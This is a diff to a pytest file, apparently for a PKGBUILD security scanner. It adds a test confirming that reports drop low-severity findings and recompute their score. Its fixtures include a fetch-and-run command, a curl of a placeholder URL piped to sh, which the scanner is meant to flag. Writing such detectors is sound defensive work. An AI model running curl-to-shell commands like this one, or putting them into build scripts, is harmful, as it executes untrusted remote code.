@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import json
+from pathlib import Path
 
 import pytest
 from rich.console import Console
@@ -25,6 +26,8 @@ from tests.rules_utils import make_meta
 STRONG = "b1946ac92492d2347c6235b4d2611184b1946ac92492d2347c6235b4d2611184"
 CURL_SNIPPET = "curl -s https://example.invalid/a.sh"
 PIPE_COMMAND = f"{CURL_SNIPPET} | sh"
+FIXTURES = Path(__file__).parent / "fixtures"
+SOURCES = (FIXTURES / "suspicious" / "sources.PKGBUILD").read_text(encoding="utf-8")
 SOURCE = f"""\
 pkgname=demo
 pkgver=1.0
@@ -73,6 +76,35 @@ def test_json_report_finding_has_full_schema() -> None:
     assert item["line"] == SOURCE.splitlines().index(f"  {PIPE_COMMAND}") + 1
     assert item["snippet"] == CURL_SNIPPET
     assert item["source"] == "static"
+
+
+def test_build_report_filters_below_min_severity_and_rescores() -> None:
+    parsed = parse_pkgbuild(SOURCES)
+    assert parsed.pkgbuild is not None
+    meta = make_meta()
+    context = RuleContext(
+        pkgbuild=parsed.pkgbuild,
+        install_scripts=(),
+        meta=meta,
+    )
+    findings = registry.run_all(context)
+    config = load_scoring_config()
+
+    unfiltered = build_report(meta, parsed, findings, config=config)
+    filtered = build_report(
+        meta,
+        parsed,
+        findings,
+        config=config,
+        min_severity=Severity.MEDIUM,
+    )
+
+    assert any(item.severity is Severity.LOW for item in unfiltered.findings)
+    assert filtered.findings
+    assert all(item.severity is not Severity.LOW for item in filtered.findings)
+    expected = sum(config.weights[item.severity] for item in filtered.findings)
+    assert filtered.score == min(expected, config.max_score)
+    assert filtered.score < unfiltered.score
 
 
 def _empty_report(
